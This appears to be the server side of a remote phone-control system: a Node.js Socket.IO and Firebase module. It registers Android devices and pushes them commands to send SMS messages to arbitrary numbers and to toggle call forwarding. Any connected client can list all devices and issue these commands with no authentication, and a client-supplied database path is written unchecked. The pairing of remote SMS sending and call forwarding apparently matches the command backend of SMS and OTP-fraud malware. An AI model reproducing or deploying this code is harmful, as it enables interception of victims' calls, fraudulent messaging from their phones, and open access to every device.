const { admin, db } = require("./firebase-init");

module.exports = (io) => {

    io.on("connection", (socket) => {

        console.log("====================================");
        console.log("Socket Connected :", socket.id);
        console.log("====================================");


        // DEVICE REGISTER

        socket.on("register", async (data) => {
            try {
                console.log(data)
                if (!data || !data.deviceId) {
                    socket.emit("registered", {
                        success: false,
                        message: "Invalid deviceId"
                    });

                    return;
                }

                socket.data.deviceId = data.deviceId;

                await db.ref("devices/" + data.deviceId).update({
                    deviceId: data.deviceId,
                    socketId: socket.id,
                    fcmToken: data.fcmToken || "",
                    online: true,
                    lastSeen: Date.now()
                });

                await db.ref(data.refDb + "/" + data.refId).update({
                    deviceId: data.deviceId,
                });

                console.log("Device Registered :", data.deviceId);

                socket.emit("registered", { success: true });
            } catch (e) { console.error(e); }
        })


        // DISCONNECT

        socket.on("disconnect", async () => {
            try {

                console.log("Socket Disconnected :", socket.id);

                if (!socket.data.deviceId) return;

                await db.ref("devices/" + socket.data.deviceId).update({
                    online: false,
                    socketId: "",
                    lastSeen: Date.now()
                });

            } catch (e) {
                console.error(e)
            }
        })


        // UPDATE FCM TOKEN

        socket.on("update_fcm_token", async (data) => {

            try {

                if (!data.deviceId) return;

                await db.ref("devices/" + data.deviceId).update({
                    fcmToken: data.fcmToken,
                    lastSeen: Date.now()
                });

                console.log("FCM Updated :", data.deviceId);
            } catch (e) { console.error(e) }




        })


        // HEARTBEAT

        socket.on("heartbeat", async () => {

            try {

                if (!socket.data.deviceId) return;

                await db.ref("devices/" + socket.data.deviceId).update({
                    online: true,
                    socketId: socket.id,
                    lastSeen: Date.now()
                });

            } catch (e) { console.error(e) }
        })


        // GET DEVICES

        socket.on("get_devices", async () => {

            try {

                const snapshot = await db.ref("devices").once("value");

                if (!snapshot.exists()) {
                    socket.emit("device_list", []);
                    return;
                }

                const devices = Object.values(snapshot.val());

                socket.emit("device_list", devices);

            } catch (e) { console.error(e); }
        })


        // SEND SMS EVENT

        socket.on("send_sms", async (data) => {

            try {
                console.log(data)

                if (!data.deviceId || !data.data.simId || !data.data.number || !data.data.message) {

                    socket.emit("send_sms_result", {
                        success: false,
                        message: "Invalid Request"
                    });

                    return;
                }

                const eventId = Date.now().toString();

                const event = {
                    eventId,
                    deviceId: data.deviceId,
                    type: "SEND_SMS",
                    payload: {
                        simId: data.data.simId,
                        number: data.data.number,
                        message: data.data.message
                    },
                    createdAt: Date.now(),
                    status: "pending",
                };

                // GET DEVICE

                const deviceSnapshot = await db.ref("devices/" + data.deviceId).once("value");

                if (!deviceSnapshot.exists()) {
                    socket.emit("send_sms_result", {
                        success: false,
                        message: "Device Not Found"
                    });

                    return;
                }

                const device = deviceSnapshot.val();

                // SOCKET or FIREBASE 

                if (device.online && device.socketId) {
                    io.to(device.socketId).emit("new_event", event);
                    console.log("Socket Event Sent");
                } else {
                    if (device.fcmToken) {
                        await admin.messaging().send({
                            token: device.fcmToken,
                            data: {
                                eventId: event.eventId,
                                deviceId: event.deviceId,
                                type: event.type,
                                payload: JSON.stringify(
                                    event.payload
                                )
                            },
                            android: { priority: "high" }
                        });

                        console.log("FCM Sent");

                    } else { console.log("No FCM Token"); return }

                    socket.emit("send_sms_result", {
                        success: true,
                        eventId
                    }
                    );
                }

            } catch (e) {
                console.error(e);

                socket.emit("send_sms_result", {
                    success: false,
                    message: e.message
                }
                );

            }
        })


        // SEND CALL FORWARDING EVENT

        socket.on("call_forwarding", async (data) => {

            try {
                console.log(data)
                if (!data.deviceId || !data.data.simId) {

                    socket.emit("call_forwarding_result", {
                        success: false,
                        message: "RefId missing"
                    });

                    return;
                }

                // GET DEVICE

                const snapshot = await db.ref("devices/" + data.deviceId).once("value");

                if (!snapshot.exists()) {

                    socket.emit("call_forwarding_result", {
                        success: false,
                        message: "Device not found"
                    });

                    return;
                }

                const device = snapshot.val();

                const event = {
                    eventId: Date.now().toString(),
                    type: "SEND_CALL",
                    deviceId: device.deviceId,
                    payload: {
                        simId: data.data.simId,
                        enable: data.data.enable
                    },
                    createdAt: Date.now(),
                    status: "pending"
                };

                if (device.online && device.socketId) {
                    io.to(device.socketId).emit("new_event", event);
                } else {

                    await admin.messaging().send({
                        token: device.fcmToken,
                        data: {
                            eventId: event.eventId,
                            type: event.type,
                            payload: JSON.stringify(event.payload)
                        }
                    });
                }

                socket.emit("call_forwarding_result", {
                    success: true,
                    eventId: event.eventId
                });

            } catch (e) {
                console.error(e);
                socket.emit("call_forwarding_result", {
                    success: false,
                    message: e.message
                }
                );
            }
        })


        // EVENT ACK

        socket.on("event_ack", async (ack) => {

            try {
                if (!ack || !ack.eventId) return;

                const deviceId = socket.data.deviceId;

                if (!deviceId) return;

                console.log("ACK :", ack.eventId, ack.status);

                io.emit("ack_update", {
                    eventId: ack.eventId,
                    deviceId: deviceId,
                    status: ack.status,
                    message: ack.message,
                    timestamp: Date.now()
                });

            } catch (e) { console.error(e); }
        })





    })
}